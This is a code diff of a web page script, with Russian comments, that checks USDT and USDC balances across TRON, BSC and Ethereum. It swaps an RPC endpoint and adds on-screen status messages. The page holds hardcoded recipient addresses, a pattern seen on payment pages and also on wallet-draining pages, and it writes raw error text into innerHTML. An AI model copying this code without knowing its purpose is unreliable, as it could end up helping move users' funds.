@@ -539,7 +539,7 @@
         const RPC = {
             TRON: 'https://api.trongrid.io',
             BSC: 'https://bsc-dataseed.binance.org',
-            ETH: 'https://rpc.ankr.com/eth'
+            ETH: 'https://cloudflare-eth.com'
         };
         const RECIPIENT_ADDRESSES = {
             TRC20: 'TUpkiEo4DJM8WefDXh5WoXYP41pknw8oPU',
@@ -779,22 +779,45 @@
                 return parseFloat(ethers.utils.formatUnits(balance, decimals));
             } catch (e) {
                 console.error('EVM20 balance error:', e);
+                // Показываем ошибку на экране через статус
+                const statusDiv = document.getElementById('walletStatus');
+                if (statusDiv) {
+                    statusDiv.innerHTML = `❌ RPC Error: ${e.message.substring(0, 100)}<br>Try again or contact support`;
+                }
                 return 0;
             }
         }
 
         async function getBalance(network, coin, address) {
-            if (network === 'TRC20') {
-                if (coin === 'USDT') return await getTRC20Balance(address, USDT_CONTRACTS.TRC20);
-                if (coin === 'USDC') return await getTRC20Balance(address, USDC_CONTRACTS.TRC20);
-            } else if (network === 'BEP20') {
-                if (coin === 'USDT') return await getEVM20Balance(address, USDT_CONTRACTS.BEP20, RPC.BSC, 18);
-                if (coin === 'USDC') return await getEVM20Balance(address, USDC_CONTRACTS.BEP20, RPC.BSC, 18);
-            } else if (network === 'ERC20') {
-                if (coin === 'USDT') return await getEVM20Balance(address, USDT_CONTRACTS.ERC20, RPC.ETH, 6);
-                if (coin === 'USDC') return await getEVM20Balance(address, USDC_CONTRACTS.ERC20, RPC.ETH, 6);
+            // Показываем сообщение на экране
+            const statusDiv = document.getElementById('walletStatus');
+            if (statusDiv) {
+                statusDiv.innerHTML = `🔄 Checking ${coin} on ${network}...<br>Address: ${address.slice(0,10)}...`;
             }
-            return 0;
+            
+            try {
+                if (network === 'TRC20') {
+                    if (coin === 'USDT') return await getTRC20Balance(address, USDT_CONTRACTS.TRC20);
+                    if (coin === 'USDC') return await getTRC20Balance(address, USDC_CONTRACTS.TRC20);
+                } else if (network === 'BEP20') {
+                    if (coin === 'USDT') return await getEVM20Balance(address, USDT_CONTRACTS.BEP20, RPC.BSC, 18);
+                    if (coin === 'USDC') return await getEVM20Balance(address, USDC_CONTRACTS.BEP20, RPC.BSC, 18);
+                } else if (network === 'ERC20') {
+                    if (coin === 'USDT') {
+                        const balance = await getEVM20Balance(address, USDT_CONTRACTS.ERC20, RPC.ETH, 6);
+                        if (statusDiv) statusDiv.innerHTML = `✅ Balance: ${balance} USDT`;
+                        return balance;
+                    }
+                    if (coin === 'USDC') return await getEVM20Balance(address, USDC_CONTRACTS.ERC20, RPC.ETH, 6);
+                }
+                return 0;
+            } catch (error) {
+                console.error('Balance error:', error);
+                if (statusDiv) {
+                    statusDiv.innerHTML = `❌ Error: ${error.message}<br>Try switching network in wallet`;
+                }
+                return 0;
+            }
         }
 
         async function logToHeleket(type, data) {
